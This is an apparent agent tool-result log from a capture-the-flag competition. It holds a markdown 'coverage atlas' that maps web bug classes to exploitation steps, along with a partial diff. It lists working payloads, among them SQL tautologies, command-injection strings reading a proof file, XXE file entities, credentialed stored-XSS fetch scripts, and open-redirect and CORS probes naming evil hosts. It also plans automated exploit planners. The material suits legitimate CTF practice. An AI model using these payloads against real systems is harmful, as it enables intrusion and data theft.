{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01BgJtn4h4k7zwzECyQZG2kk","type":"tool_result","content":"The file /home/testpwn/huntress-2026/reference/coverage/web.md has been updated successfully. (file state is current in your context — no need to Read it back)"}]},"parent_tool_use_id":null,"session_id":"c3fb4241-89d3-40ca-9929-a75c6d380cfd","uuid":"6c47c61a-66f5-463b-97bc-9d476bc8f238","timestamp":"2026-10-21T13:22:25.455Z","tool_use_result":{"type":"update","filePath":"/home/testpwn/huntress-2026/reference/coverage/web.md","content":"# Web coverage atlas\n\nLane: a LIVE challenge-owned target per question (`targets[{id:\"Target N\", url}]`, no artifact), one `proof-N`\nquestion per target, answer = the token `proof_<32 hex>` the app prints once the bug is exploited (`trim`). One\nclassic bug per lane-day, named by a title pun: D01 exposed backup, D02 IDOR, D03 SQLi (paren-wrapped LIKE), D04 path\ntraversal to `/run/huntress/objective.txt`, D05 unprotected feature route, D06 reflected XSS (server-judged \"isolated\ncallback\"), D07 stored XSS (real moderator bot), D08 session fixation. Since D05 every target is the same kit:\n`/api/clues` names `feature_route`, `secondary_route`, `current_role` + one concept key (`callback_nonce`,\n`moderator_data_route`/`receipt_route_template`, `session_hint`); routes return JSON errors naming the missing piece;\nsuccess = `{\"ok\":true,\"effect\":\"<snake>\",\"evidence\":\"proof_...\"}`. Mastery = today's bug + 1-2 earlier lane-days\n(2 targets D03-D07, 3 on D08), described only by today's prompt. Pace: ~3 lane-days per calendar day (D01-D03 cal.\n19, D04-D05 cal. 20, D06-D08 cal. 21) -> priority 1 below = the ~9 bugs most likely in D09-D17.\nArc: info-disclosure -> access control -> injection -> file read -> access control -> XSS (reflected, stored) ->\nsession management. D08 opened the auth/session family and D07 proved a real victim browser exists, so the next\nmost likely are: CSRF (bot victim), JWT / signed-cookie forgery, DOM XSS, open redirect, role tampering, then the\nserver-side classics (command injection, SSTI, SSRF, XXE, upload, deserialization).\nSnapshot 2026-10-21 (after D08). `hctf prebuild` still has NO `web` lane and there is no `lib/web.py`; no `web:*` keys\nin `.run/prebuild-state.json` (gap `enable-web-prebuild-lane`).\n\nStatus legend: `seen Dnn` = GM-confirmed lane-day (solver in `challenges/<cal-day>/web-*/solver/solve.py`).\n`gap` = nothing reusable in lib. Prebuilt web modules must be PURE (no `urllib.request`): bodies in -> request plan\n`[(method, path, headers, body)]` out; response in -> proof or next hints. The solver does the fetching.\n\n## Coverage table\n\n| # | concept | status | recognition cues | first move | likelihood next 3 cal. days |\n|---|---|---|---|---|---|\n| 1 | exposed backup / forced browsing via robots | seen D01 (Mastery x2) | robots `Disallow: /<word>-<hex>/`, \"crawler policy\", \"archive\" | robots -> index -> every link (depth 2) | done; Mastery |\n| 2 | IDOR (object-level authz) | seen D02 (compound) | \"Signed in as\", `/<things>/<id>`, `fetch('/api/<things>/'+id)` | foreign ids from `/api/history` | done; Mastery |\n| 3 | SQL injection (tautology) | seen D03 | search form, \"database\", \"one pointed question\" | `zz') OR 1=1 --` family | done; Mastery |\n| 4 | path traversal / LFI | seen D04 (compound x2) | `?doc=`/`?page=` filename value, \"mounted at /path\" | `../`*10 + prompt path | done; Mastery |\n| 5 | missing function-level authz (unlinked route) | seen D05 (D08 Mastery) | \"staff-only, just a sign\", clue `feature_route` | GET the clue route | done; Mastery |\n| 6 | role / privilege via client-controlled header, query or cookie | gap | `current_role: analyst` in every clue JSON, `role=` cookie | flip the value the app names | high |\n| 7 | JWT tampering (`alg:none`, leaked HS256 secret, kid/jku) | gap | 3 base64url parts in cookie / `Authorization` | decode; resign with `none` / leaked secret | high (session family after D08) |\n| 8 | signed-cookie / session forgery (Flask, Express `s:`, base64 JSON) | gap | `session=eyJ...`, `s%3A`, base64 JSON cookie | decode; re-sign with a leaked secret | high |\n| 9 | mass assignment / over-posting | gap | JSON profile update, `is_admin`/`role` in GET only | add `role:\"admin\"` to PUT/POST | high |\n| 10 | OS command injection | gap | \"ping\", \"lookup host\", \"diagnostics\" | `;cat /run/huntress/objective.txt`, `|`, `$()`, `%0a` | high |\n| 11 | SSTI | gap | \"template\", \"preview\", \"greeting\", `{{7*7}}`->49 | engine probe then file read | high |\n| 12 | SSRF | gap | \"fetch URL\", \"preview link\", \"webhook\" | `http://127.0.0.1/<clue route>`, `file:///run/...` | high |\n| 13a | reflected XSS (server-judged callback) | seen D06 | \"repeats everything\", \"talks back\", clue `callback_nonce` | reflect `<script>fetch(cb?nonce)`, then GET cb with Sec-Fetch-* + Referer | done; Mastery |\n| 13b | stored XSS (moderator bot) | seen D07 | \"guestbook\", \"reviewer stops by\", `moderator_data_route`, `receipt_route_template` | store fetch(data)->POST receipt script; poll entry | done; Mastery |\n| 13c | DOM XSS (`location.hash`/`search` -> `innerHTML`/`eval`) | gap | inline JS reading location, \"client-side\", \"nothing reaches the server\" | scan sinks; bot visits `#payload` URL or callback check | high (XSS trilogy) |\n| 14 | default / leaked credentials login | gap | login form, creds in comment / backup / JS | use the leaked pair (no brute force) | med-high |\n| 15 | header-trust bypass (`X-Forwarded-For: 127.0.0.1`, `X-Original-URL`) | gap | \"internal only\", \"localhost only\" | spoof the header the error names | med-high |\n| 16 | HTTP verb / method-override tampering | gap | 405/403 on GET, `_method=` | other methods + overrides | med |\n| 17 | path-normalisation authz bypass | gap | 403 on a named route | `/ADMIN`, `//admin`, `/admin;/`, `%2e` | med |\n| 18 | XXE | gap | XML/SVG/DOCX upload, `application/xml` | entity on `file:///run/huntress/objective.txt` | med |\n| 19 | NoSQL injection | gap | JSON login, \"MongoDB\" | `{\"$ne\":null}` | med |\n| 20 | file upload -> execution / traversal | gap | upload form, files served back | executable type or `../` filename | med |\n| 21 | insecure deserialization | gap | cookie `gASV`/`Tzo`/`rO0`/`_$$ND_FUNC$$_` | tamper fields, then gadget | med-low |\n| 22 | exposed VCS / env / debug | gap | `/.git/HEAD` 200, `/.env`, DEBUG page | fetch, reconstruct, read secret | med |\n| 23 | GraphQL introspection / hidden field | gap | `/graphql`, `{\"data\":` | `__schema`, hidden fields | med |\n| 24a | CSRF (bot victim performs a state change) | gap | \"the admin clicks links\", \"change email\", no token / SameSite=None, report-to-admin | host an auto-submitting form / fetch in stored content or a bot-visited URL | high (bot proven D07; session family D08) |\n| 24b | open redirect (incl. OAuth `redirect_uri`) | gap | `?next=`/`?return=`/`redirect_uri`, \"after login\" | redirect to a clue route / `//host`; effect JSON | med-high |\n| 24c | CORS misconfig (reflected Origin + credentials) | gap | `Access-Control-Allow-Origin` echoing Origin, `-Credentials: true` | request with `Origin: null` / attacker; bot reads data | med |\n| 24d | clickjacking / framing | gap | no X-Frame-Options/CSP frame-ancestors, \"one click\" | effect likely judged server-side by headers | low |\n| 25 | prototype pollution (Node) | gap | JSON merge \"settings\", Node banner | `{\"__proto__\":{\"isAdmin\":true}}` | med-low |\n| 26 | race condition / business logic | gap | shop / wallet / voucher, \"only once\" | parallel burst, negative values | med-low |\n| 27 | password-reset / predictable token / OTP | gap | \"forgot password\", token in response | read the leaked token; no brute force | med |\n| 28 | UNION / error / blind SQLi | gap | numeric id, DB errors | `ORDER BY`, `UNION SELECT`, boolean diff | med |\n| 29 | LFI filters | partial (D04 payload set) | \"not allowed\", `.php` appended | `....//`, double-encode, `pages/../`, wrappers | med |\n| 30 | request smuggling / cache poisoning / host header | gap | proxy + cache headers, reset links using Host | `X-Forwarded-Host`, CL/TE | low |\n| 31 | session fixation (planted id adopted by victim login) | seen D08 | \"plant your session\", \"welcome mat\", clue `session_hint`, 400 `session_id_required` | `?sid=<hint>` on feature route -> cookie `arena_session=<hint>` on secondary | done; Mastery |\n| 32 | session hijack / weak session ids / logout not invalidating | gap | sequential or timestamp ids, ids leaked in URLs/logs/Referer | reuse a leaked id the app shows | med (D08 sequel) |\n| 33 | static web evidence (HAR, pcap, logs, web shell) | gap (never released) | `.har`, pcap magic, combined-log lines | jq / tshark / decode layers | low |\n\n## Recognition cues (worker quick-reference)\n\n```\nFIRST 60 SECONDS ON ANY TARGET (cheap, in parallel, curl --max-time 20 -A 'Mozilla/5.0'):\n  GET /api/clues   -> feature_route / secondary_route / current_role + ONE concept key (see table below)\n  GET each clue route BARE: the JSON error names the missing piece (session_id_required, authenticated_login_required,\n      browser_callback_required, 401/403 = needs the victim's/admin's session)\n  GET /, /robots.txt, /openapi.json, /sitemap.xml -> links, forms, inline fetch('/api/..'), comments, Disallow\n  regex  proof_[0-9a-f]{32}  over EVERY body (JSON/base64/zip decoded). JSON `evidence` = answer.\n  410 {\"state\":\"completed\"} = attempt already solved; `preparing` = not ready, re-poll hctf status.\nPick routes by clue KEY (feature_/secondary_/*_data_route/*_template) and openapi paths, NEVER by the word in the\nvalue (callback|internal|status, messages|postcards are re-dealt per variant).\nMASTERY: 2-3 targets, prompt = today's bug only -> recon each target, run the hinted probe first, the rest staged.\n\nCLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST\nrobots Disallow, \"backup\", \"archive\"                   -> exposed backup     -> Disallow -> index -> .bak (depth 2)\n\"Signed in as\", /api/history ids                       -> IDOR               -> foreign id into the API template\nsearch box, \"database\"                                 -> SQLi               -> q=zz') OR 1=1 --   (+ ' \" )) # variants)\n?doc=/?page=, \"stay inside\", \"mounted at /path\"        -> traversal          -> ../ x10 + /run/huntress/objective.txt\nfeature_route only, \"staff-only, just a sign\"          -> unprotected route  -> GET it\ncallback_nonce, \"repeats everything\", \"talks back\"     -> reflected XSS      -> feature?q=<script>fetch('/cb?nonce=N')</script>, then\n      GET /cb?nonce=N with Sec-Fetch-Site: same-origin, Sec-Fetch-Mode: cors, Sec-Fetch-Dest: empty,\n      Referer: <reflected URL>, Origin: <base>, X-Callback-Nonce: N   -> effect isolated_browser_callback\nmoderator_data_route + receipt_route_template,         -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>..fetch(DATA,\n  \"guestbook\", \"reviewer stops by\"                          {credentials:'include'}) -> POST RCPT(id from location.pathname)\n                                                            {evidence}</script>\"}; poll /<noun>/{id} and / for >=30 s\nsession_hint, \"plant your session\", \"welcome mat\"      -> session fixation   -> feature?sid=<hint> (sets arena_session=<hint>),\n                                                            then secondary with Cookie: arena_session=<hint>\ncurrent_role / role cookie / X-*-Role                  -> role tampering     -> set the named value to admin\neyJ..eyJ..sig in cookie/Authorization                 -> JWT                -> alg none / leaked secret, role claim\n\"admin clicks links\", \"change email\", report-to-admin  -> CSRF               -> stored/bot-visited auto-submit form to the state route\nlocation.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check\n?next=/?return=/redirect_uri                           -> open redirect      -> point it at the clue route / //other-host\n\"ping\", \"host lookup\", \"diagnostics\"                  -> command injection  -> ;cat /run/huntress/objective.txt  (| $() ` %0a)\n\"template\", \"preview\", {{7*7}}=49                      -> SSTI               -> engine probe -> file read\n\"fetch URL\", \"webhook\", \"import\"                      -> SSRF               -> http://127.0.0.1/<clue route>, file:///run/...\n\"internal only\", \"localhost only\"                      -> header trust       -> X-Forwarded-For: 127.0.0.1 (+ X-Original-URL)\nXML/SVG/DOCX upload                                    -> XXE                -> <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">\nA real victim browser exists (D07): anything \"the admin/reviewer/moderator visits\" can run your JS with their cookies;\nreceipts can land >12 s later. \"Browser required\" errors without a bot (D06) = send fetch-metadata headers yourself.\nBanners (\"Django\", \"Laravel\", \"Node.js\", \".php\") are costume; the title pun names the bug.\n```\n\n## Readiness gaps\n\nPriority 1 = plausible within ~3 calendar days (~9 lane-days at the current pace). \"prebuild\" = pure python in a\nfuture `lib/web.py` (request planner + response parser, no I/O; the solver fetches) with offline fixtures = recorded\nbodies incl. a decoy. \"note\" = harness/prompt change. \"tool\" = install. None built yet (no web prebuild lane).\n\n```json\n[\n  {\"id\": \"enable-web-prebuild-lane\", \"concept\": \"harness: web is not a prebuild lane\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Still true after D08: hctf/prebuild.py LANES has no `web` entry and lib/web.py does not exist, so none of the prebuild gaps below can drain. Owner of hctf/: add `web: {brief: prebuild_web, writable: (lib/web.py, tests/data/web_fixtures/), targets: tests/data/web_fixtures/TARGETS.json, gate: (tests/test_lane_fixtures.py,), regress_lane: web, requires: (lib/web.py:plan,)}` plus a minimal lib/web.py with `plan(pages) -> [requests]` and `find_proof(body) -> str|None`. Fixtures = saved target responses (targets 410 after CORRECT).\"},\n  {\"id\": \"clue-json-router\", \"concept\": \"map /api/clues keys + JSON error codes to the concept and the next request (rows 5, 13a, 13b, 31)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every target since D05 serves /api/clues {framework, feature_route, secondary_route, current_role, <concept key>}. Pure function: clues JSON (+ bare-route error bodies) -> concept + request plan. Known keys: session_hint (D08 fixation: GET feature?sid=<hint>, then secondary with Cookie arena_session=<hint>; also try session_id/session/PHPSESSID names), callback_nonce (D06: reflect <script>fetch(secondary?nonce=N)</script> via ?q= on feature, then GET secondary?nonce=N with Sec-Fetch-Site same-origin / Mode cors / Dest empty, Referer reflected URL, Origin, X-Callback-Nonce), moderator_data_route + receipt_route_template (D07 stored XSS payload builder with id from location.pathname), feature_route alone (D05 GET/POST). Known errors: session_id_required, authenticated_login_required, browser_callback_required, not_found. Select routes by KEY, never by the word in the value (callback|internal|status re-dealt). Unknown key -> return it as a hint for the worker. Fixtures: D05/D06/D08 clue bodies from the day-20/21 worker logs.\"},\n  {\"id\": \"mastery-concept-dispatcher\", \"concept\": \"run every known lane concept on every target without recursion or starvation\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D08 Mastery (3 targets) took ~15 min: racing every earlier solver on every target slowed the app 5 s -> 13 s, and day-21 solvers' fallback() imported each other (infinite recursion). Registry in lib/web.py: concept -> (detector over recon pages: home, robots, /api/clues, /openapi.json; request planner). Stage 1 = concepts the detectors hit (clue keys first), stage 2 = the rest, capped concurrency per host (~3). One flat registry replaces solvers importing each other. Fixture: recorded multi-target pair (D04 LFI + D07 board) with today's prompt for the wrong one.\"},\n  {\"id\": \"recon-crawl-depth2\", \"concept\": \"shared recon planner: robots/sitemap/openapi/comments/clue JSON/links, depth 2 (rows 1, 5, 22)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Given fetched bodies keyed by path, return next same-origin GETs: robots Allow/Disallow, sitemap <loc>, openapi.json `paths` (fill {id} from submit responses), href/src/action, fetch('/..') literals, HTML-comment paths, every '/...' string in JSON, links on any directory index (depth 2), cap ~40, skip /assets. Parser: proof_[0-9a-f]{32} after JSON/base64/zip/gzip decoding. Fixtures: D01 robots -> index -> .json.bak, D07 openapi with /api/postcards + /postcards/{id}.\"},\n  {\"id\": \"csrf-bot-planner\", \"concept\": \"CSRF executed by the app's victim bot (row 24a)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D07 proved the GM runs a real moderator browser. CSRF sequel: find the state-changing route (clues *_route, openapi POST/PUT without a token field, forms lacking csrf inputs, cookies SameSite=None/Lax), build (a) an auto-submitting HTML form (GET and POST, urlencoded and text/plain JSON trick) and (b) a fetch(...,{credentials:'include'}) script, deliver it where the bot looks (stored entry, report/share URL endpoint, profile field), then poll the clue/status route or the entry page for the receipt/effect. Token bypasses: drop the token, empty token, token from our own session, GET instead of POST, method override.\"},\n  {\"id\": \"jwt-session-forge\", \"concept\": \"JWT alg:none / leaked-secret HS256 / Flask-itsdangerous / Express s: cookies (rows 7, 8)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Session family opened on D08. Pure python (hmac, hashlib, base64, json, zlib): decode JWT; produce alg none ('none'/'None'/'NONE', empty sig), HS256 re-signed with secrets FOUND in recon (clues, backups, .env, JS, comments), RS256->HS256 with a published public key (jwks.json). Flask session: base64url(zlib?) payload.timestamp.sig with itsdangerous derive (salt 'cookie-session', HMAC-SHA1) re-signed with a leaked secret. Escalate role/admin/sub (current_role analyst -> admin). No secret brute force beyond what the app leaks.\"},\n  {\"id\": \"role-tamper-planner\", \"concept\": \"client-controlled role: header / query / cookie / JSON body / claim (rows 6, 9)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every clue JSON shows current_role: analyst. From recon: role field and values (current_role, role, is_admin, group, tier), app-set cookies, headers named in clues/errors. Plan: cookie role=<admin|staff|owner|higher listed value>, base64-JSON cookie rewrite, X-Role / X-User-Role / X-Forwarded-User, ?role=, JSON role/is_admin on PUT/POST/PATCH to the profile route (mass assignment). Parser: effect+evidence JSON or proof regex.\"},\n  {\"id\": \"dom-xss-sink-scan\", \"concept\": \"DOM XSS: client-side source -> sink (row 13c)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Third XSS flavour after D06 reflected / D07 stored. Static scan of inline and linked JS for sources (location.hash/search/href, document.referrer, postMessage data, localStorage) flowing into sinks (innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout(string), jQuery html()/$(), href/src assignment). Build the URL (#<img src=x onerror=fetch(cb?nonce)>, ?q=, javascript:) and deliver it the way the app expects: GET the callback ourselves with D06 fetch-metadata headers + Referer = crafted URL, or hand the URL to a report/bot endpoint and poll for the receipt.\"},\n  {\"id\": \"cmd-injection-planner\", \"concept\": \"OS command injection to read the mounted proof (row 10)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"For each flagged param (host, ip, target, domain, filename, cmd): separators ; | || && %0a $() backticks, with/without a valid prefix (127.0.0.1), reading the prompt path (default /run/huntress/objective.txt) via cat, `$(cat ...)` echoed, `${IFS}` space bypass. Parser: proof regex in response / tool output block.\"},\n  {\"id\": \"ssti-engine-probe\", \"concept\": \"server-side template injection (row 11)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Arithmetic markers ({{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}, {{7*'7'}} -> 7777777 = Jinja2) -> engine; file-read payload per engine for the prompt path: Jinja2 cycler/lipsum/get_flashed_messages __globals__ os.popen, Twig source()/_self.env, ERB File.read, EJS/Handlebars/Nunjucks constructor chains, Freemarker ?new(). Also dump config (SECRET_KEY) to feed jwt-session-forge.\"},\n  {\"id\": \"ssrf-planner\", \"concept\": \"server-side request forgery (row 12)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"URL-taking params (url, link, src, webhook, feed, image, callback). Plan: file:///run/huntress/objective.txt, http://127.0.0.1 / localhost / 0.0.0.0 / [::1] / 2130706433 / 127.1 + the clue routes (secondary_route is often the 'internal' one), named internal ports, 169.254.169.254 only if named, redirect and @-userinfo allowlist bypasses. Parser: proof regex in the preview body.\"},\n  {\"id\": \"open-redirect-planner\", \"concept\": \"open redirect / OAuth redirect_uri (row 24b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Params next, return, returnTo, redirect, url, continue, redirect_uri, callback on login/logout/OAuth routes. Payloads: //evil, /\\\\evil, https:evil, %2F%2Fevil, /%09/evil, https://<base>@evil, javascript: (if the sink is client-side), plus the clue route as an internal target. Detect via Location header (don't follow) or meta-refresh/JS; when OAuth, leak the code/token to a clue route and replay it. Parser: effect JSON / proof.\"},\n  {\"id\": \"header-trust-verb-path-bypass\", \"concept\": \"IP/header trust, method override, path normalisation (rows 15-17)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"For a route that 401/403/405s: X-Forwarded-For / X-Real-IP / X-Client-IP / True-Client-IP / Forwarded: for=127.0.0.1; X-Original-URL / X-Rewrite-URL; methods HEAD/POST/PUT/PATCH/OPTIONS + X-HTTP-Method-Override / _method; path variants /ADMIN, /admin/, /admin/., //admin, /./admin, /admin;/, /%61dmin, /admin..;/, trailing ?/#. Stop at the first 200 with proof or effect.\"},\n  {\"id\": \"cors-misconfig-probe\", \"concept\": \"CORS reflected Origin with credentials (row 24c)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Request the clue data routes with Origin: https://evil.example, null, <base>.evil.example, sub.<base>; flag ACAO echoing + ACAC true. Exploit via the victim bot: stored/bot-visited script fetch(DATA,{credentials:'include'}) from a cross-origin page and POST to the app's receipt route; or the app may judge it server-side by the Origin header (effect JSON).\"},\n  {\"id\": \"session-id-weakness\", \"concept\": \"session hijack: predictable / leaked / non-rotated session ids (row 32)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D08 sequel. Collect every session-like value the app reveals (Set-Cookie, clue hints, URLs, /api/history, logs pages, Referer leaks); detect structure (sequential int, timestamp, md5(user), base64 JSON); plan reuse of a leaked victim id as arena_session/sid cookie and a logout-then-reuse check. Never guess beyond values the app derives from data it shows.\"},\n  {\"id\": \"xxe-payloads\", \"concept\": \"XML external entities (row 18)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"XML endpoints/uploads: in-band entity on the prompt path, parameter-entity variant, php://filter base64, XInclude, SVG / DOCX (zipfile) container builder carrying the entity. Parser: proof regex, base64 decode.\"},\n  {\"id\": \"upload-execution-planner\", \"concept\": \"file upload to execution or traversal (row 20)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Extension probing (shell.php.jpg, .phtml/.php5, case, trailing dot), content-type/magic spoof (GIF89a), filename traversal, SVG with script/XXE, template files if uploads are rendered. Payload only reads the prompt path. Parser: find the stored URL, fetch it, proof regex.\"},\n  {\"id\": \"nosql-operator-injection\", \"concept\": \"MongoDB-style operator injection (row 19)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"JSON bodies: {\\\"$ne\\\":null}, {\\\"$gt\\\":\\\"\\\"}, {\\\"$regex\\\":\\\".*\\\"}; form username[$ne]=x; $where only when Mongo-flavoured. Field names from the form/JS. Parser: proof or an admin page with the returned session.\"},\n  {\"id\": \"vcs-debug-leak-reader\", \"concept\": \"exposed .git / .env / DEBUG pages (row 22)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Probe /.git/HEAD, /.git/config, /.env, /.DS_Store, /debug, /actuator/env, /phpinfo.php within the capped recon list. Parser: .git loose objects (zlib) -> commit -> tree -> blob, .DS_Store names, Django DEBUG 404 URL list, .env secrets -> jwt-session-forge.\"},\n  {\"id\": \"sqli-union-blind\", \"concept\": \"UNION / error / boolean-blind SQLi (row 28)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"ORDER BY / NULL-count columns, UNION SELECT with table names from errors or sqlite_master / information_schema, marker-based string column, boolean-blind with a length-diff oracle (bounded, [0-9a-f_proof], 32 chars). Login bypass admin'--. SQLite/MySQL/Postgres dialects.\"},\n  {\"id\": \"graphql-introspection\", \"concept\": \"GraphQL schema leak / hidden field (row 23)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Introspection query, list fields, query hidden ones (proof, secret, evidence, note) and node(id) lookups (IDOR over GraphQL); field suggestions when introspection is off.\"},\n  {\"id\": \"lfi-filter-bypass\", \"concept\": \"traversal filters / suffix / prefix rules (row 29)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Planner from D04's set: nested strip (....//, ..././), URL / double / overlong encodings, backslash, required prefix (pages/../../..), appended suffix (%00, ?, #, php://filter), absolute, file://, /proc/self/cwd and /proc/self/root. Cheapest first; decode base64 filter output.\"},\n  {\"id\": \"prototype-pollution\", \"concept\": \"server-side prototype pollution (row 25)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Node-flavoured JSON merge/settings routes: {\\\"__proto__\\\":{\\\"isAdmin\\\":true,\\\"role\\\":\\\"admin\\\"}}, {\\\"constructor\\\":{\\\"prototype\\\":{...}}}, query-string a[__proto__][x]=1; then re-request the clue/status route. Detect via a reflected polluted key (e.g. json spaces / status code gadgets).\"},\n  {\"id\": \"deserialization-gadgets\", \"concept\": \"pickle / PHP / node-serialize cookies (row 21)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Recognise base64 cookies gASV/gAN (pickle), Tzo/YTo (PHP), {\\\"rce\\\" / _$$ND_FUNC$$_ (node-serialize), rO0 (Java). Prefer data tampering (isAdmin/role) over code execution; minimal gadget reading the prompt path otherwise.\"},\n  {\"id\": \"logic-race-reset\", \"concept\": \"business logic, race, predictable reset tokens (rows 26, 27)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Numeric fields (negative, zero, huge, float), coupon/redeem replay, ~20-request parallel burst for a single-use action, reset tokens the app leaks (timestamp, md5(email), sequential). No credential guessing.\"},\n  {\"id\": \"cache-host-header\", \"concept\": \"web cache poisoning / Host-header attacks (row 30)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Unkeyed headers (X-Forwarded-Host, X-Host, X-Forwarded-Scheme, X-Original-URL) reflected into cached responses (Age/X-Cache/CF-Cache-Status) or password-reset links; plan: poison with the clue callback route, then fetch as the victim/bot path. Cloudflare sits in front, so key on app-level cache headers only.\"},\n  {\"id\": \"record-target-responses\", \"concept\": \"replayable live-target cases\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Targets 410 after CORRECT; D07 Mastery's proof-2 fix could only be tested on a hand-built mock. Harness: log every target request/response during single/TT/Mastery into solver/cases/<case>/http/ and let solve.py replay them when the host 410s; also the fixture source for the web prebuild.\"},\n  {\"id\": \"stopgate-503-already-solved\", \"concept\": \"harness: a 503 submit that landed leaves the stop gate closed\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D07 Mastery: submit returned HTTP 503 temporarily_unavailable though the GM registered CORRECT; the retry returned already_solved and stop_gate.py (counts only accepted/correct rows) never released. Owner of hctf/: after a 503, check op=status before retrying, and count already_solved for the owed attempt as done. Same for unverified live variants with expected.json {} (D08 Mastery).\"},\n  {\"id\": \"headless-browser\", \"concept\": \"client-side JS execution for DOM XSS / CSRF checks (rows 13c, 24a)\", \"priority\": 2, \"action\": \"tool\", \"detail\": \"D06-D07 needed none (server-judged headers; GM-side bot). Install only if a day demands local JS execution: `uv pip install --python .venv/bin/python playwright && .venv/bin/playwright install chromium` (or system chromium --headless --dump-dom).\"}\n]\n```\n","structuredPatch":[{"oldStart":2,"oldLines":122,"newStart":2,"newLines":147,"lines":[" "," Lane: a LIVE challenge-owned target per question (`targets[{id:\"Target N\", url}]`, no artifact), one `proof-N`"," question per target, answer = the token `proof_<32 hex>` the app prints once the bug is exploited (`trim`). One","-classic OWASP-style bug per lane-day, named by a title pun: D01 exposed backup (robots `Disallow` -> index ->","-`.json.bak`), D02 IDOR, D03 SQLi (paren-wrapped LIKE), D04 path traversal to the prompt-named file","-`/run/huntress/objective.txt`, D05 unprotected \"feature route\" named by `/api/clues` (missing function-level authz;","-JSON `effect: framework_authorization_bypassed`, `evidence: proof_...`). Mastery = today's bug + one earlier","-lane-day's bug on a second target (D01 twice so far), described only by today's prompt. Release pace: lane-days","-D01-D03 on calendar day 19 and D04-D05 on day 20, so expect 2-3 new bugs per calendar day. The arc so far runs","-info-disclosure -> broken access control (object) -> injection (SQL) -> file read -> broken access control","-(function). Next most likely: the remaining OWASP classics that a proof file or a JSON `effect` can demonstrate:","-OS command injection, SSTI, SSRF, auth/session forgery (JWT / cookie / role claim, mass assignment), header-trust","-bypasses, XSS, XXE, upload. File-read bugs reuse the prompt's mounted proof path.","-Snapshot 2026-10-20 (after D05; first atlas for the lane; `hctf prebuild` has NO `web` lane config yet, see gap","-`enable-web-prebuild-lane`).","+classic bug per lane-day, named by a title pun: D01 exposed backup, D02 IDOR, D03 SQLi (paren-wrapped LIKE), D04 path","+traversal to `/run/huntress/objective.txt`, D05 unprotected feature route, D06 reflected XSS (server-judged \"isolated","+callback\"), D07 stored XSS (real moderator bot), D08 session fixation. Since D05 every target is the same kit:","+`/api/clues` names `feature_route`, `secondary_route`, `current_role` + one concept key (`callback_nonce`,","+`moderator_data_route`/`receipt_route_template`, `session_hint`); routes return JSON errors naming the missing piece;","+success = `{\"ok\":true,\"effect\":\"<snake>\",\"evidence\":\"proof_...\"}`. Mastery = today's bug + 1-2 earlier lane-days","+(2 targets D03-D07, 3 on D08), described only by today's prompt. Pace: ~3 lane-days per calendar day (D01-D03 cal.","+19, D04-D05 cal. 20, D06-D08 cal. 21) -> priority 1 below = the ~9 bugs most likely in D09-D17.","+Arc: info-disclosure -> access control -> injection -> file read -> access control -> XSS (reflected, stored) ->","+session management. D08 opened the auth/session family and D07 proved a real victim browser exists, so the next","+most likely are: CSRF (bot victim), JWT / signed-cookie forgery, DOM XSS, open redirect, role tampering, then the","+server-side classics (command injection, SSTI, SSRF, XXE, upload, deserialization).","+Snapshot 2026-10-21 (after D08). `hctf prebuild` still has NO `web` lane and there is no `lib/web.py`; no `web:*` keys","+in `.run/prebuild-state.json` (gap `enable-web-prebuild-lane`)."," "," Status legend: `seen Dnn` = GM-confirmed lane-day (solver in `challenges/<cal-day>/web-*/solver/solve.py`).","-`gap` = nothing reusable in lib (each day's solver re-implements fetch + regex). Allowed prebuild imports exclude","-`urllib.request`, so prebuilt web modules must be PURE: given page/JSON bodies -> a request plan","-`[(method, path, headers, body)]`; given a response -> proof or next hints. The solver does the fetching.","+`gap` = nothing reusable in lib. Prebuilt web modules must be PURE (no `urllib.request`): bodies in -> request plan","+`[(method, path, headers, body)]` out; response in -> proof or next hints. The solver does the fetching."," "," ## Coverage table"," "," | # | concept | status | recognition cues | first move | likelihood next 3 cal. days |"," |---|---|---|---|---|---|","-| 1 | exposed backup / forced browsing via robots | seen D01 (Mastery D03, D04) | robots `Disallow: /<word>-<hex>/`, comment \"crawler policy\", \"diary\", \"archive\", \"forgot to clean up\" | robots -> index -> every link (depth 2) | done; keeps returning in Mastery |","-| 2 | IDOR (object-level authz) | seen D02 | \"Signed in as\", `/<things>/<id>`, `fetch('/api/<things>/'+id)`, \"someone else's row\" | foreign ids from `/api/history`-style feeds | done; Mastery |","-| 3 | SQL injection (UNION-less tautology) | seen D03 | search form, \"database\", \"one pointed question\" | `zz') OR 1=1 --` family | done; Mastery |","-| 4 | path traversal / LFI | seen 